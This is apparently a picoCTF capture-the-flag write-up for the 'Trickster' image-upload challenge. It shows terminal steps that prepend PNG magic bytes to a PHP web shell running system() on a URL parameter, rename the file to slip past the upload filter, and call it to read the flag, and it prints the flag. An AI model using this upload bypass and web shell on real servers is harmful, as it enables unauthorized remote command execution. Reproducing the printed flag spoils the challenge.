# Trickster

## Descripción

I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:49937/)!
## Solución

```
┌──(flavio㉿kali)-[~]
└─$ nano webshell.php         
 
┌──(flavio㉿kali)-[~]
└─$ cp webshell.php webshell.php.png
                                                              
┌──(flavio㉿kali)-[~]
└─$ nano webshell.php.png 
                                                              
┌──(flavio㉿kali)-[~]
└─$ xxd webshell.php.png        
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss
00000010: 6574 2824 5f47 4554 5b27 636d 6427 5d29  et($_GET['cmd'])
00000020: 2920 7b0a 2020 2020 6563 686f 2022 3c70  ) {.    echo "<p
00000030: 7265 3e22 3b0a 2020 2020 7379 7374 656d  re>";.    system
00000040: 2824 5f47 4554 5b27 636d 6427 5d29 3b0a  ($_GET['cmd']);.
00000050: 2020 2020 6563 686f 2022 3c2f 7072 653e      echo "</pre>
00000060: 223b 0a7d 0a3f 3e0a                      ";.}.?>.                        
┌──(flavio㉿kali)-[~]
└─$ mv webshell.php.png webshell.png.php

http://atlas.picoctf.net:49937/uploads/webshell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt

PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */
```

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
## Notas adicionales

Aprovechamos una vulnerabilidad al subir archivos png y subimos un php que nos permite acceder a comandos desde la url.
## Referencias
